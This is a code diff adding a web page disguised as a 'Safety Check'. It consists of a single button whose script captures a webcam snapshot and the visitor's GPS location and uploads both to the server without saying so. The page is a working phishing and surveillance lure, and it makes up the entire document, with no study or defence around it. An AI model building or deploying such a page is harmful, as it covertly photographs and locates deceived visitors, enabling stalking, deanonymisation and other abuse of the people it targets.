@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Safety Check</title>
+</head>
+<body>
+    <center>
+    <h1>Safety Check.....</h1>
+    
+    <h1><button onclick="sendData()">Click</button></h1></center>
+
+    <script>
+        async function sendData() {
+            let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            let video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            let canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            let image = canvas.toDataURL('image/png');
+
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                let location = pos.coords.latitude + "," + pos.coords.longitude;
+
+                await fetch('/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: `image=${encodeURIComponent(image)}&location=${location}`
+                });
+
+                alert("Sent successfully!");
+            });
+        }
+    </script>
+</body>
+</html>
